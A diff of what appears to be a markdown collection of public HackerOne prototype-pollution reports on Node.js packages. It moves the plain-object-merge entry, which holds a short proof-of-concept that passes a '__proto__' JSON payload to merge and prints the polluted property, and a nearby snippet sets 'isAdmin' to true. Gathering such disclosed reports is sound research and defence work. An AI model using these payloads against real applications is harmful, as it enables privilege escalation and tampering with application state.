@@ -258,23 +258,6 @@ extend(true, {}, JSON.parse('{"__proto__": {"isAdmin": true}}'));
 console.log({}.isAdmin); // true
 ```
 
-## #871156 [plain-object-merge] Prototype pollution — nodejs-ecosystem — - — Modification of Assumed-Immutable Data (MAID)
-Source: `hackerone/reports/2021/871156.md` (https://hackerone.com/reports/871156)
-
-```
-const merge = require('plain-object-merge');
-const payload =  JSON.parse('{"__proto__":{"polluted":"yes"}}');
-const obj = {};
-console.log("Before : " + obj.polluted);
-merge([{}, payload]);
-console.log("After : " + obj.polluted);
-```
-
-```
-Before : undefined
-After : yes
-```
-
 ## #438274 Prototype pollution attack (smart-extend) — nodejs-ecosystem — - — None
 Source: `hackerone/reports/2019/438274.md` (https://hackerone.com/reports/438274)
 
@@ -291,6 +274,23 @@ console.log("After: ", test.polluted);
 ```
 Before:  undefined
 After:  deep_done !
+```
+
+## #871156 [plain-object-merge] Prototype pollution — nodejs-ecosystem — - — Modification of Assumed-Immutable Data (MAID)
+Source: `hackerone/reports/2021/871156.md` (https://hackerone.com/reports/871156)
+
+```
+const merge = require('plain-object-merge');
+const payload =  JSON.parse('{"__proto__":{"polluted":"yes"}}');
+const obj = {};
+console.log("Before : " + obj.polluted);
+merge([{}, payload]);
+console.log("After : " + obj.polluted);
+```
+
+```
+Before : undefined
+After : yes
 ```
 
 ## #390847 Prototype Pollution Vulnerability in cached-path-relative Package — nodejs-ecosystem — - — Uncontrolled Resource Consumption
